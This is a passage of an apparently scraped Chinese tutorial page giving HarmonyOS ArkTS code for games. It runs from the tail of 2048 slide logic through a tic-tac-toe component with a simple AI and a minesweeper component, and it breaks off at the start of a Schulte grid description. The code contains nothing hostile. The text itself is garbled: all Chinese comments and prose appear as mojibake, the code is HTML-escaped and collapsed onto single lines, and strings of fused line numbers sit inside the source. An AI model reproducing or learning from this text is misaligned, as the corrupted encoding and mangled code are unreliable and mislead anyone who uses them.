newRow = 0; newRow &lt; 4; newRow++) &#123; this.board[newRow][col].value = tempCol[newRow]; // æ›´æ–°ç›˜é¢ &#125; &#125; &#125; // å‘ä¸‹æ»‘åŠ¨ slideDown() &#123; for (let col = 0; col &lt; 4; col++) &#123; let tempCol: number[] = []; // ä¸´æ—¶å­˜å‚¨åˆ—æ•°æ® let merged: boolean[] = new Array(4).fill(false); // æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡ // ä»ä¸‹å¾€ä¸Šéå†åˆ— for (let row = 3; row &gt;= 0; row--) &#123; if (this.board[row][col].value !== 0) &#123; tempCol.unshift(this.board[row][col].value); // ç§»åŠ¨éé›¶å€¼ &#125; &#125; let mergePos = tempCol.length - 1; while (mergePos &gt; 0) &#123; if (tempCol[mergePos] === tempCol[mergePos - 1] &amp;&amp; !merged[mergePos - 1]) &#123; tempCol[mergePos] *= 2; // åˆå¹¶ this.score += tempCol[mergePos]; // æ›´æ–°åˆ†æ•° merged[mergePos - 1] = true; // æ ‡è®°å·²åˆå¹¶ tempCol.splice(mergePos - 1, 1); // ç§»é™¤åˆå¹¶è¿‡çš„å€¼ &#125; else &#123; mergePos--; &#125; &#125; // å¦‚æœæ•°ç»„é•¿åº¦å°äº4ï¼Œç”¨0å¡«å…… while (tempCol.length &lt; 4) &#123; tempCol.unshift(0); // å¡«å……ç©ºä½ &#125; // å°†å¤„ç†åçš„æ•°ç»„å…ƒç´ æ”¾å›åˆ°æ£‹ç›˜çš„å¯¹åº”åˆ—ä¸­ for (let row = 0; row &lt; 4; row++) &#123; this.board[3 - row][col].value = tempCol[3 - row]; // æ³¨æ„åè½¬é¡ºåº &#125; &#125; &#125; // æ„å»ºæ¸¸æˆç•Œé¢ build() &#123; // å¸ƒå±€å®¹å™¨ Column(&#123; space: 10 &#125;) &#123; // æ˜¾ç¤ºå¾—åˆ† Text(`å¾—åˆ†: $&#123;this.score&#125;`) .fontSize(24) .margin(&#123; top: 20 &#125;) // åº•å±‚èƒŒæ™¯å¸ƒå±€ Flex(&#123; wrap: FlexWrap.Wrap, direction: FlexDirection.Row &#125;) &#123; // éå†æ¯ä¸ªå•å…ƒæ ¼ ForEach(this.board.flat(), (cell: Cell, index: number) =&gt; &#123; // æ˜¾ç¤ºå•å…ƒæ ¼ä¸Šçš„æ•°å­— Text(`$&#123;cell.value || &#x27;&#x27;&#125;`) .width(`$&#123;this.cellSize&#125;px`) .height(`$&#123;this.cellSize&#125;px`) .margin(`$&#123;this.cellMargin&#125;px`) .fontSize(`$&#123;cell.value &gt;= 100 ? this.cellSize / 3 : this.cellSize / 2&#125;px`) // æ ¹æ®æ•°å­—å¤§å°è°ƒæ•´å­—ä½“å¤§å° .textAlign(TextAlign.Center) .backgroundColor(this.colors[cell.value == 0?0:Math.floor(Math.log2(cell.value))]) // è®¾ç½®èƒŒæ™¯é¢œè‰² .fontColor(cell.value === 0 ? &#x27;#000&#x27; : &#x27;#fff&#x27;) // è®¾ç½®å­—ä½“é¢œè‰² .borderRadius(5) // åœ†è§’ &#125;) &#125; .width(`$&#123;(this.cellSize + this.cellMargin * 2) * 4&#125;px`) // è®¾ç½®å®¹å™¨å®½åº¦ // é‡æ–°å¼€å§‹æŒ‰é’® Button(&#x27;é‡æ–°å¼€å§‹&#x27;).onClick(() =&gt; &#123; this.aboutToAppear(); // é‡æ–°å¼€å§‹æ¸¸æˆ &#125;) &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .onTouch((e) =&gt; &#123; if (e.type === TouchType.Down &amp;&amp; e.touches.length &gt; 0) &#123; // è§¦æ‘¸å¼€å§‹ï¼Œè®°å½•åˆå§‹ä½ç½® this.screenStartX = e.touches[0].x; this.screenStartY = e.touches[0].y; &#125; else if (e.type === TouchType.Up &amp;&amp; e.changedTouches.length &gt; 0) &#123; // å½“æ‰‹æŒ‡æŠ¬èµ·æ—¶ï¼Œæ›´æ–°æœ€åçš„ä½ç½® this.lastScreenX = e.changedTouches[0].x; this.lastScreenY = e.changedTouches[0].y; &#125; &#125;) .gesture( SwipeGesture(&#123; direction: SwipeDirection.All &#125;) // æ”¯æŒæ–¹å‘ä¸­ allå¯ä»¥æ˜¯ä¸Šä¸‹å·¦å³ .onAction((_event: GestureEvent) =&gt; &#123; const swipeX = this.lastScreenX - this.screenStartX; const swipeY = this.lastScreenY - this.screenStartY; // æ¸…é™¤å¼€å§‹ä½ç½®è®°å½•ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡æ»‘åŠ¨åˆ¤æ–­ this.screenStartX = 0; this.screenStartY = 0; if (Math.abs(swipeX) &gt; Math.abs(swipeY)) &#123; if (swipeX &gt; 0) &#123; this.slideRight(); // å‘å³æ»‘åŠ¨ &#125; else &#123; this.slideLeft(); // å‘å·¦æ»‘åŠ¨ &#125; &#125; else &#123; if (swipeY &gt; 0) &#123; this.slideDown(); // å‘ä¸‹æ»‘åŠ¨ &#125; else &#123; this.slideUp(); // å‘ä¸Šæ»‘åŠ¨ &#125; &#125; this.addRandomTiles(1); // æ·»åŠ ä¸€ä¸ªéšæœºæ–¹å— &#125;) ) &#125;&#125; Xâœ”123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; const winningLines = [ [0, 0, 0, 1, 0, 2], // Horizontal 1 [1, 0, 1, 1, 1, 2], // Horizontal 2 [2, 0, 2, 1, 2, 2], // Horizontal 3 [0, 0, 1, 0, 2, 0], // Vertical 1 [0, 1, 1, 1, 2, 1], // Vertical 2 [0, 2, 1, 2, 2, 2], // Vertical 3 [0, 0, 1, 1, 2, 2], // Diagonal \\ [0, 2, 1, 1, 2, 0]// Diagonal /]; @ObservedV2class GridCell &#123; @Trace value: string = &quot;&quot;; // å½“å‰æ ¼å­çš„å€¼ rowIndex: number = 0; // æ ¼å­æ‰€åœ¨çš„è¡Œå· colIndex: number = 0; // æ ¼å­æ‰€åœ¨çš„åˆ—å· constructor(rowIndex: number, colIndex: number) &#123; this.rowIndex = rowIndex; this.colIndex = colIndex; &#125;&#125;@Entry@Componentstruct TicTacToe &#123; @State board: GridCell[][] = []; // æ¸¸æˆæ¿ @State currentPlayer: string = &#x27;X&#x27;; // å½“å‰ç©å®¶ @State isGameOver: boolean = false; // æ¸¸æˆæ˜¯å¦ç»“æŸ @State winner: string = &#x27;&#x27;; // è·èƒœè€… @State cellSize: number = 120; // å•å…ƒæ ¼å¤§å° @State cellMargin: number = 5; // å•å…ƒæ ¼è¾¹è· // ç»„ä»¶å³å°†å‡ºç°æ—¶åˆå§‹åŒ–æ¸¸æˆ aboutToAppear(): void &#123; this.board = [ [new GridCell(0, 0), new GridCell(0, 1), new GridCell(0, 2)], [new GridCell(1, 0), new GridCell(1, 1), new GridCell(1, 2)], [new GridCell(2, 0), new GridCell(2, 1), new GridCell(2, 2)] ]; this.initGame(); // åˆå§‹åŒ–æ¸¸æˆçŠ¶æ€ &#125; // é‡ç½®æ¸¸æˆçŠ¶æ€ initGame() &#123; for (let i = 0; i &lt; 3; i++) &#123; for (let j = 0; j &lt; 3; j++) &#123; this.board[i][j].value = &#x27;&#x27;; // æ¸…ç©ºæ‰€æœ‰å•å…ƒæ ¼ &#125; &#125; this.currentPlayer = &#x27;X&#x27;; // è®¾ç½®å½“å‰ç©å®¶ä¸ºX this.isGameOver = false; // æ¸¸æˆæœªç»“æŸ this.winner = &#x27;&#x27;; // æ— è·èƒœè€… &#125; // æ£€æŸ¥æ˜¯å¦æœ‰ç©å®¶è·èƒœ checkForWinner() &#123; for (let line of winningLines) &#123; // éå†æ‰€æœ‰èƒœåˆ©çº¿è·¯ const mark = this.board[line[0]][line[1]].value; if (mark &amp;&amp; // å¦‚æœæœ‰æ ‡è®° mark === this.board[line[2]][line[3]].value &amp;&amp; // å¹¶ä¸”ç­‰äºåŒä¸€è¡Œçš„ä¸‹ä¸€ä¸ªæ ‡è®° mark === this.board[line[4]][line[5]].value) &#123; // å†æ¬¡ç­‰äºåŒä¸€è¡Œçš„ä¸‹ä¸€ä¸ªæ ‡è®° this.isGameOver = true; // æ¸¸æˆç»“æŸ this.winner = mark; // è®¾ç½®è·èƒœè€… return mark; // è¿”å›è·èƒœè€…çš„æ ‡è®° &#125; &#125; const allCellsFilled = this.board.flat().every(cell =&gt; cell.value !== &#x27;&#x27;); // æ£€æŸ¥æ‰€æœ‰å•å…ƒæ ¼æ˜¯å¦å·²å¡«æ»¡ if (allCellsFilled) &#123; this.isGameOver = true; // æ¸¸æˆç»“æŸ this.winner = &#x27;å¹³å±€&#x27;; // è®¾ç½®ä¸ºå¹³å±€ return &#x27;å¹³å±€&#x27;; // è¿”å›å¹³å±€æ ‡è¯† &#125; return &#x27;&#x27;; // æ— è·èƒœè€… &#125; // ç©å®¶è½å­ placeMark(rowIndex: number, colIndex: number) &#123; if (!this.isGameOver &amp;&amp; this.board[rowIndex][colIndex].value === &#x27;&#x27;) &#123; // å¦‚æœæ¸¸æˆæœªç»“æŸä¸”å•å…ƒæ ¼ä¸ºç©º this.board[rowIndex][colIndex].value = this.currentPlayer; // æ”¾ç½®æ ‡è®° const result = this.checkForWinner(); // æ£€æŸ¥æ˜¯å¦æœ‰è·èƒœè€… if (result) &#123; // å¦‚æœæœ‰è·èƒœè€… console.info(`$&#123;result&#125; è·èƒœï¼`); let message = `$&#123;result&#125; è·èƒœï¼`; // è®¾ç½®æç¤ºä¿¡æ¯ if (result === &#x27;å¹³å±€&#x27;) &#123; message = &#x27;å¹³å±€ï¼&#x27;; // å¦‚æœæ˜¯å¹³å±€ &#125; promptAction.showDialog(&#123; // æ˜¾ç¤ºå¯¹è¯æ¡† title: `æ¸¸æˆç»“æŸ`, // æ ‡é¢˜ message, // æç¤ºä¿¡æ¯ buttons: [ // æŒ‰é’® &#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, // æ–‡æœ¬ color: &#x27;#ffa500&#x27; // é¢œè‰² &#125; ], &#125;).then(() =&gt; &#123; this.initGame(); // é‡æ–°å¼€å§‹æ¸¸æˆ &#125;); &#125; else &#123; // å¦‚æœæ²¡æœ‰è·èƒœè€… this.currentPlayer = this.currentPlayer === &#x27;X&#x27; ? &#x27;O&#x27; : &#x27;X&#x27;; // åˆ‡æ¢ç©å®¶ if (this.currentPlayer === &#x27;O&#x27;) &#123; // å¦‚æœæ˜¯AIç©å®¶ this.aiMove(); // AIè½å­ &#125; &#125; &#125; &#125; // AIè½å­ aiMove() &#123; let moveFound = false; let bestMove: null | number[] = null; // å¯»æ‰¾æœ€ä½³è½å­ä½ç½® bestMove = this.findWinningMove(&#x27;O&#x27;); // æ£€æŸ¥AIæ˜¯å¦æœ‰èƒœåˆ©æœºä¼š console.info(`bestMove a:$&#123;JSON.stringify(bestMove)&#125;`); if (bestMove) &#123; moveFound = true; &#125; else &#123; bestMove = this.findWinningMove(&#x27;X&#x27;); // æ£€æŸ¥ç©å®¶æ˜¯å¦æœ‰èƒœåˆ©æœºä¼š console.info(`bestMove b:$&#123;JSON.stringify(bestMove)&#125;`); if (bestMove) &#123; moveFound = true; &#125; else &#123; bestMove = this.findRandomMove(); // éšæœºè½å­ console.info(`bestMove c:$&#123;JSON.stringify(bestMove)&#125;`); if (bestMove) &#123; moveFound = true; &#125; &#125; &#125; if (moveFound &amp;&amp; bestMove) &#123; // å¦‚æœæ‰¾åˆ°äº†åˆé€‚çš„è½å­ä½ç½® console.info(`bestMove:$&#123;JSON.stringify(bestMove)&#125;`); this.placeMark(bestMove[0], bestMove[1]); // è½å­ &#125; &#125; // å¯»æ‰¾ç»™å®šç©å®¶æ˜¯å¦æœ‰æœºä¼šèµ¢ï¼Œå¹¶è¿”å›è¿™æ ·çš„ç§»åŠ¨ä½ç½® findWinningMove(player: string) &#123; for (let line of winningLines) &#123; // éå†æ‰€æœ‰èƒœåˆ©çº¿è·¯ let missingIndex = -1; let noEmptyCount = 0; for (let i = 0; i &lt; line.length; i += 2) &#123; // æ£€æŸ¥æ¯ä¸ªå•å…ƒæ ¼ if (this.board[line[i]][line[i + 1]].value === player) &#123; // å¦‚æœæ˜¯è¯¥ç©å®¶çš„æ ‡è®° noEmptyCount++; // è®¡æ•° &#125; else if (this.board[line[i]][line[i + 1]].value === &#x27;&#x27;) &#123; // å¦‚æœä¸ºç©º missingIndex = i; // è®°å½•ç©ºæ ¼ä½ç½® &#125; &#125; if (noEmptyCount === 2 &amp;&amp; missingIndex != -1) &#123; // å¦‚æœæœ‰ä¸¤ä¸ªæ ‡è®°ä¸”æœ‰ä¸€ä¸ªç©ºæ ¼ return [line[missingIndex], line[missingIndex + 1]]; // è¿”å›ç©ºæ ¼ä½ç½® &#125; &#125; return null; // æœªæ‰¾åˆ°åˆé€‚ä½ç½® &#125; // å¯»æ‰¾ä¸€ä¸ªéšæœºçš„åˆæ³•è½å­ä½ç½® findRandomMove() &#123; let emptyCells: number[][] = []; // å­˜å‚¨ç©ºæ ¼ä½ç½® for (let i = 0; i &lt; 3; i++) &#123; for (let j = 0; j &lt; 3; j++) &#123; if (this.board[i][j].value === &#x27;&#x27;) &#123; // å¦‚æœå•å…ƒæ ¼ä¸ºç©º emptyCells.push([i, j]); // æ·»åŠ åˆ°ç©ºæ ¼åˆ—è¡¨ &#125; &#125; &#125; if (emptyCells.length &gt; 0) &#123; // å¦‚æœæœ‰ç©ºæ ¼ return emptyCells[Math.floor(Math.random() * emptyCells.length)]; // éšæœºé€‰æ‹©ä¸€ä¸ªç©ºæ ¼ &#125; return null; // æœªæ‰¾åˆ°ç©ºæ ¼ &#125; // æ„å»ºæ¸¸æˆç•Œé¢ build() &#123; Column(&#123; space: 20 &#125;) &#123; // åˆ›å»ºä¸»åˆ—å¸ƒå±€ Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // åˆ›å»ºä¸»è¡Œå¸ƒå±€ ForEach(this.board, (row: GridCell[], _index: number) =&gt; &#123; // éå†æ¯ä¸€è¡Œ ForEach(row, (cell: GridCell, _index: number) =&gt; &#123; // éå†æ¯ä¸€ä¸ªå•å…ƒæ ¼ Text(cell.value) // æ˜¾ç¤ºå•å…ƒæ ¼å†…çš„æ–‡æœ¬ .width(`$&#123;this.cellSize&#125;lpx`) // è®¾ç½®å®½åº¦ .height(`$&#123;this.cellSize&#125;lpx`) // è®¾ç½®é«˜åº¦ .margin(`$&#123;this.cellMargin&#125;lpx`) // è®¾ç½®è¾¹è· .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) // è®¾ç½®å­—ä½“å¤§å° .textAlign(TextAlign.Center) // å±…ä¸­æ–‡æœ¬ .backgroundColor(cell.value === &#x27;X&#x27; ? Color.Red : // è®¾ç½®èƒŒæ™¯é¢œè‰² cell.value === &#x27;O&#x27; ? Color.Blue : Color.Gray) .fontColor(Color.White) // è®¾ç½®å­—ä½“é¢œè‰² .borderRadius(5) // è®¾ç½®åœ†è§’ .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ this.placeMark(cell.rowIndex, cell.colIndex); // è½å­ &#125;); &#125;) &#125;) &#125; .width(`$&#123;(this.cellSize + this.cellMargin * 2) * 3&#125;lpx`) // è®¾ç½®å®½åº¦ Button(&#x27;é‡æ–°å¼€å§‹&#x27;) // é‡æ–°å¼€å§‹æŒ‰é’® .width(&#x27;50%&#x27;) // è®¾ç½®å®½åº¦ .height(&#x27;10%&#x27;) // è®¾ç½®é«˜åº¦ .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ this.initGame(); // é‡æ–°å¼€å§‹æ¸¸æˆ &#125;); &#125; .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ .height(&#x27;100%&#x27;); // è®¾ç½®é«˜åº¦ &#125;&#125; mineæ‰«é›· å®ç°æ­¥éª¤ æ­¥éª¤1ï¼šå®šä¹‰æ¸¸æˆçŠ¶æ€ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰æ¸¸æˆçš„çŠ¶æ€å˜é‡ï¼ŒåŒ…æ‹¬æ¸¸æˆé¢æ¿æ•°æ®ã€åœ°é›·æ•°é‡ã€å·²æ­ç¤ºæ–¹å—é›†åˆã€æ ‡è®°ä¸ºåœ°é›·çš„æ–¹å—é›†åˆç­‰ã€‚ æ­¥éª¤2ï¼šåˆå§‹åŒ–æ¸¸æˆ åœ¨ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶åˆå§‹åŒ–æ¸¸æˆï¼ŒåŒ…æ‹¬æ¸…ç©ºçŠ¶æ€å˜é‡ã€ç”Ÿæˆæ¸¸æˆé¢æ¿ã€æ”¾ç½®åœ°é›·ç­‰ã€‚ æ­¥éª¤3ï¼šç”Ÿæˆæ¸¸æˆé¢æ¿ä¸æ”¾ç½®åœ°é›· æ¸¸æˆé¢æ¿ç”±10x10çš„æ–¹å—ç»„æˆï¼Œéšæœºæ”¾ç½®10ä¸ªåœ°é›·ï¼Œå¹¶è®¡ç®—æ¯ä¸ªæ–¹å—å‘¨å›´çš„åœ°é›·æ•°é‡ã€‚ æ­¥éª¤4ï¼šå¤„ç†ç”¨æˆ·äº¤äº’ ç”¨æˆ·å¯ä»¥é€šè¿‡ç‚¹å‡»æ–¹å—æ¥æ­ç¤ºå…¶å†…å®¹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é•¿æŒ‰æ¥æ ‡è®°åœ°é›·ã€‚ æ­¥éª¤5ï¼šæ˜¾ç¤ºæ¸¸æˆç»“æœ å½“ç©å®¶æ­ç¤ºåˆ°åœ°é›·æ—¶ï¼Œæ¸¸æˆç»“æŸï¼›å½“æ‰€æœ‰éé›·æ–¹å—éƒ½è¢«æ­ç¤ºæ—¶ï¼Œæ¸¸æˆèƒœåˆ©ã€‚ æ­¥éª¤6ï¼šå®šä¹‰Cellç±» æœ€åï¼Œå®šä¹‰ä¸€ä¸ªCellç±»æ¥å­˜å‚¨æ¯ä¸ªæ–¹å—çš„ä¿¡æ¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; @Entry@Componentstruct MineSweeper &#123; // æ¸¸æˆé¢æ¿æ•°æ® @State private gameBoard: Cell[][] = []; // åœ°é›·æ€»æ•° @State private mineCount: number = 10; // å·²ç»æ­ç¤ºçš„æ–¹å—é›†åˆ @State private revealedCells: Set&lt;string&gt; = new Set(); // æ ‡è®°ä¸ºåœ°é›·çš„æ–¹å—é›†åˆ @State private flaggedCells: Set&lt;string&gt; = new Set(); // æ–¹å—å¤§å° @State private cellSize: number = 60; // æ–¹å—ä¹‹é—´çš„è¾¹è· @State private cellMargin: number = 2; // æ¸¸æˆå¼€å§‹æ—¶é—´ private startTime: number = Date.now(); // æ¸¸æˆç»“æŸæ ‡å¿— @State private isGameOver: boolean = false; // åœ¨ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶åˆå§‹åŒ–æ¸¸æˆ aboutToAppear(): void &#123; this.initializeGame(); &#125; // åˆå§‹åŒ–æ¸¸æˆ private initializeGame() &#123; this.isGameOver = false; this.startTime = Date.now(); this.revealedCells.clear(); this.flaggedCells.clear(); this.generateBoard(); &#125; // ç”Ÿæˆæ¸¸æˆé¢æ¿ private generateBoard() &#123; this.gameBoard = []; for (let i = 0; i &lt; 10; i++) &#123; this.gameBoard.push([]); for (let j = 0; j &lt; 10; j++) &#123; this.gameBoard[i].push(new Cell(i, j)); &#125; &#125; this.placeMines(); this.calculateNumbers(); &#125; // éšæœºæ”¾ç½®åœ°é›· private placeMines() &#123; let placed = 0; while (placed &lt; this.mineCount) &#123; let x = Math.floor(Math.random() * 10); let y = Math.floor(Math.random() * 10); if (!this.gameBoard[x][y].hasMine) &#123; this.gameBoard[x][y].hasMine = true; placed++; &#125; &#125; &#125; // è®¡ç®—æ¯ä¸ªæ–¹å—å‘¨å›´çš„åœ°é›·æ•°é‡ private calculateNumbers() &#123; for (let i = 0; i &lt; 10; i++) &#123; for (let j = 0; j &lt; 10; j++) &#123; if (!this.gameBoard[i][j].hasMine) &#123; this.gameBoard[i][j].neighborMines = this.countNeighborMines(i, j); this.gameBoard[i][j].value = this.gameBoard[i][j].neighborMines.toString(); &#125; else &#123; this.gameBoard[i][j].value = &#x27;é›·&#x27;; &#125; &#125; &#125; &#125; // è®¡ç®—ç»™å®šåæ ‡å‘¨å›´åœ°é›·çš„æ•°é‡ private countNeighborMines(row: number, col: number): number &#123; let count = 0; for (let dx = -1; dx &lt;= 1; dx++) &#123; for (let dy = -1; dy &lt;= 1; dy++) &#123; if (dx === 0 &amp;&amp; dy === 0) &#123; continue; &#125; let newRow = row + dx, newCol = col + dy; if (newRow &gt;= 0 &amp;&amp; newRow &lt; 10 &amp;&amp; newCol &gt;= 0 &amp;&amp; newCol &lt; 10 &amp;&amp; this.gameBoard[newRow][newCol].hasMine) &#123; count++; &#125; &#125; &#125; return count; &#125; // æ­ç¤ºæ–¹å— private revealCell(row: number, col: number) &#123; if (this.isGameOver || this.revealedCells.has(`$&#123;row&#125;,$&#123;col&#125;`)) &#123; return; &#125; const key = `$&#123;row&#125;,$&#123;col&#125;`; this.revealedCells.add(key); if (this.gameBoard[row][col].hasMine) &#123; this.showGameOverDialog(); &#125; else &#123; if (this.gameBoard[row][col].neighborMines === 0) &#123; for (let dx = -1; dx &lt;= 1; dx++) &#123; for (let dy = -1; dy &lt;= 1; dy++) &#123; if (dx === 0 &amp;&amp; dy === 0) &#123; continue; &#125; let newRow = row + dx, newCol = col + dy; if (newRow &gt;= 0 &amp;&amp; newRow &lt; 10 &amp;&amp; newCol &gt;= 0 &amp;&amp; newCol &lt; 10) &#123; this.revealCell(newRow, newCol); &#125; &#125; &#125; &#125; &#125; if (this.isVictory()) &#123; this.showVictoryDialog(); &#125; &#125; // æ˜¾ç¤ºæ¸¸æˆç»“æŸå¯¹è¯æ¡† private showGameOverDialog() &#123; this.isGameOver = true; promptAction.showDialog(&#123; title: &#x27;æ¸¸æˆç»“æŸ: æ¸¸æˆå¤±è´¥ï¼&#x27;, buttons: [&#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.initializeGame(); &#125;); &#125; // æ˜¾ç¤ºèƒœåˆ©å¯¹è¯æ¡† private showVictoryDialog() &#123; this.isGameOver = true; promptAction.showDialog(&#123; title: &#x27;æ­å–œä½ ï¼Œæ¸¸æˆèƒœåˆ©ï¼&#x27;, message: `ç”¨æ—¶ï¼š$&#123;((Date.now() - this.startTime) / 1000).toFixed(3)&#125;ç§’`, buttons: [&#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.initializeGame(); &#125;); &#125; // åˆ¤æ–­æ¸¸æˆæ˜¯å¦èƒœåˆ© private isVictory() &#123; let revealedNonMineCount = 0; for (let i = 0; i &lt; this.gameBoard.length; i++) &#123; for (let j = 0; j &lt; this.gameBoard[i].length; j++) &#123; if (this.revealedCells.has(`$&#123;i&#125;,$&#123;j&#125;`)) &#123; revealedNonMineCount++; &#125; &#125; &#125; return revealedNonMineCount == 90; &#125; // å†³å®šæ˜¯å¦æ˜¾ç¤ºæ–¹å—å€¼ private isShowValue(cell: Cell): string &#123; if (this.isGameOver) &#123; return cell.value === &#x27;0&#x27; ? &#x27;&#x27; : cell.value; &#125; else &#123; if (this.revealedCells.has(`$&#123;cell.row&#125;,$&#123;cell.column&#125;`)) &#123; return cell.value === &#x27;0&#x27; ? &#x27;&#x27; : cell.value; &#125; else &#123; return &#x27;&#x27;; &#125; &#125; &#125; build() &#123; Column(&#123; space: 10 &#125;) &#123; // é‡ç½®æ¸¸æˆæŒ‰é’® Button(&#x27;é‡æ–°å¼€å§‹&#x27;).onClick(() =&gt; this.initializeGame()); // åˆ›å»ºæ¸¸æˆé¢æ¿å®¹å™¨ Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // éå†æ¯ä¸€è¡Œ ForEach(this.gameBoard, (row: Cell[], rowIndex: number) =&gt; &#123; // éå†æ¯ä¸€åˆ— ForEach(row, (cell: Cell, colIndex: number) =&gt; &#123; Stack() &#123; // æ˜¾ç¤ºæ–¹å—ä¸Šçš„æ•°å­—æˆ–é›· Text(this.isShowValue(cell)) .width(`$&#123;this.cellSize&#125;lpx`) .height(`$&#123;this.cellSize&#125;lpx`) .margin(`$&#123;this.cellMargin&#125;lpx`) .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) .textAlign(TextAlign.Center) .backgroundColor(this.revealedCells.has(`$&#123;rowIndex&#125;,$&#123;colIndex&#125;`) ? (this.isShowValue(cell) === &#x27;é›·&#x27; ? Color.Red : Color.White) : Color.Gray) .fontColor(!this.revealedCells.has(`$&#123;rowIndex&#125;,$&#123;colIndex&#125;`) || this.isShowValue(cell) === &#x27;é›·&#x27; ? Color.White : Color.Black) .borderRadius(5) .parallelGesture(GestureGroup(GestureMode.Exclusive, TapGesture(&#123; count: 1, fingers: 1 &#125;) .onAction(() =&gt; this.revealCell(rowIndex, colIndex)), LongPressGesture(&#123; repeat: true &#125;) .onAction(() =&gt; cell.isFlag = true) )); // æ˜¾ç¤ºæ ‡è®°æ——å¸œ Text(`$&#123;!this.revealedCells.has(`$&#123;rowIndex&#125;,$&#123;colIndex&#125;`) ? &#x27;æ——&#x27; : &#x27;&#x27;&#125;`) .width(`$&#123;this.cellSize&#125;lpx`) .height(`$&#123;this.cellSize&#125;lpx`) .margin(`$&#123;this.cellMargin&#125;lpx`) .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) .textAlign(TextAlign.Center) .fontColor(Color.White) .visibility(cell.isFlag &amp;&amp; !this.isGameOver ? Visibility.Visible : Visibility.None) .onClick(() =&gt; &#123; cell.isFlag = false; &#125;) &#125; &#125;); &#125;); &#125; .width(`$&#123;(this.cellSize + this.cellMargin * 2) * 10&#125;lpx`); &#125; .backgroundColor(Color.Orange) .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;); &#125;&#125; // æ–¹å—ç±»@ObservedV2class Cell &#123; // æ–¹å—æ‰€åœ¨çš„è¡Œ row: number; // æ–¹å—æ‰€åœ¨çš„åˆ— column: number; // æ˜¯å¦æœ‰åœ°é›· hasMine: boolean = false; // å‘¨å›´åœ°é›·æ•°é‡ neighborMines: number = 0; // æ˜¯å¦è¢«æ ‡è®°ä¸ºåœ°é›· @Trace isFlag: boolean = false; // æ–¹å—å€¼ @Trace value: string; // æ„é€ å‡½æ•° constructor(row: number, column: number) &#123; this.row = row; this.column = column; this.value = &#x27;&#x27;; &#125;&#125; Schrulte Gridèˆ’å°”ç‰¹æ–¹æ ¼ï¼ˆSchrulte Gridï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸ºèˆ’å°”ç‰¹è¡¨æˆ–èˆ’å°”ç‰¹å›¾è¡¨ï¼Œæ˜¯ä¸€ç§ç”¨äºè®­ç»ƒæ³¨æ„åŠ›ã€è§†è§‰æœç´¢é€Ÿåº¦å’Œå¹¿åº¦çš„ç®€å•è€Œæœ‰æ•ˆçš„å·¥å…·ã€‚å®ƒé€šå¸¸ç”±ä¸€ä¸ª5x5çš„æ–¹æ ¼ç»„æˆï¼Œæ¯ä¸ªå°æ ¼å­é‡Œéšæœºå¡«å†™äº†1åˆ°25çš„æ•°å­—ã€‚è®­ç»ƒè€…éœ€è¦å°½å¿«åœ°æŒ‰ç…§æ•°å­—é¡ºåºæ‰¾å‡ºè¿™äº›æ•°å­—ï¼Œå¹¶ç”¨æ‰‹æŒ‡æŒ‡å‡ºæˆ–è¯´å‡ºå®ƒä»¬çš„ä½ç½®ã€‚ è¿™ç§ç»ƒä¹ å¯ä»¥å¸®åŠ©æé«˜çœ¼ç›çš„ç§»åŠ¨é€Ÿåº¦ã€æ‰©å¤§è§†é‡èŒƒå›´ã€å¢å¼ºå¤§è„‘çš„ååº”é€Ÿåº¦å’Œä¸“æ³¨åŠ›ï¼Œå› æ­¤å¸¸è¢«ç”¨æ¥ä½œä¸ºå„¿ç«¥å’Œæˆäººçš„æ³¨æ„åŠ›è®­ç»ƒæ–¹æ³•ä¹‹ä¸€ã€‚æ­¤å¤–ï¼Œå®ƒä¹Ÿè¢«ä¸€äº›ä¸“ä¸šé¢†åŸŸï¼ˆå¦‚é£è¡Œå‘˜ã€è¿åŠ¨å‘˜ç­‰ï¼‰ç”¨æ¥æå‡å¿«é€Ÿä¿¡æ¯å¤„ç†èƒ½åŠ›å’Œå†³ç­–æ•ˆç‡ã€‚ è¿›è¡Œèˆ’å°”ç‰¹æ–¹æ ¼è®­ç»ƒæ—¶ï¼Œå»ºè®®ï¼š 